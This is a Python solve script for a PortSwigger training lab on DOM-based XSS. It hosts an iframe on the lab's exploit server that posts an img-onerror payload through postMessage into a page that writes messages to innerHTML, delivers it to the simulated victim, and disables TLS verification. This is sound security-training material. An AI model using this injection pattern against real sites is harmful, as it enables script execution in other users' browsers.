#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: DOM XSS using web messages.

The lab's home page has a `message` listener that writes `e.data` to
`innerHTML` with no origin check. We host an iframe on the exploit server
that posts an <img onerror=print()> payload into the lab's window.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


EXPLOIT_BODY_TEMPLATE = (
    '<iframe src="{lab}/" '
    'onload="this.contentWindow.postMessage(\'<img src=1 onerror=print()>\',\'*\')">'
)


def post_exploit(exploit_server: str, body: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": body,
        "formAction": "STORE",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Stored exploit on server")


def deliver(exploit_server: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "formAction": "DELIVER_TO_VICTIM",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Delivered exploit to victim")


def main():
    parser = argparse.ArgumentParser(
        description="Solve DOM-based Lab 1: DOM XSS using web messages"
    )
    parser.add_argument("lab_url", help="Lab URL, e.g. https://0aXX00...web-security-academy.net")
    parser.add_argument("exploit_url", help="Exploit server URL, e.g. https://exploit-0aYY...exploit-server.net")
    parser.add_argument("--deliver", action="store_true", help="Store + DELIVER_TO_VICTIM (otherwise just prints the body)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_url.rstrip("/")

    body = EXPLOIT_BODY_TEMPLATE.format(lab=lab)
    print("[+] Exploit server body:\n")
    print(body)

    if args.deliver:
        s = requests.Session()
        s.verify = False
        post_exploit(exploit, body, s)
        deliver(exploit, s)
        r = s.get(lab)
        if "Congratulations" in r.text or "is-solved" in r.text:
            print("[+] Lab solved!")
        else:
            print("[*] Lab not yet marked solved — give the victim a few seconds and re-check.")
    else:
        print("\n[*] Paste the body into the exploit server, Store, then Deliver to Victim.")


if __name__ == "__main__":
    main()
